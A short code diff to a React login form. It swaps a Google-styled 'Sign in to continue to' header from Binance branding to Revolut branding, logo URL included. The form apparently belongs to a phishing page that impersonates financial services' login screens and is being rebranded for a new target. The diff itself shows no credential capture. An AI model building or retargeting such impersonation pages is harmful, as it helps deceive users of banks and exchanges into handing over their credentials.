@@ -96,15 +96,15 @@ export default function LoginForm() {
                                 <div className="responsive-spacing">
                                     <div className="h-12 w-12 sm:h-16 sm:w-16">
                                         <img 
-                                            src="https://lh3.googleusercontent.com/89koR46wNEOHYkbF86ZlmxqGlPO5WQiMuWLDzir_AVDZ2yMRspD25KMvauINOtZxmlSH" 
-                                            alt="binance.com"
+                                            src="https://assets.revolut.com/assets/brand/Revolut-Black.svg" 
+                                            alt="revolut.com"
                                             className="w-full h-full"
                                         />
                                     </div>
                                     <h1 className="responsive-header google">Sign in</h1>
                                     <p className="responsive-text google">
                                         to continue to 
-                                        <a href="#" className="text-blue-700"> binance.com</a>
+                                        <a href="#" className="text-blue-700"> revolut.com</a>
                                     </p>
                                 </div>
                             </div>
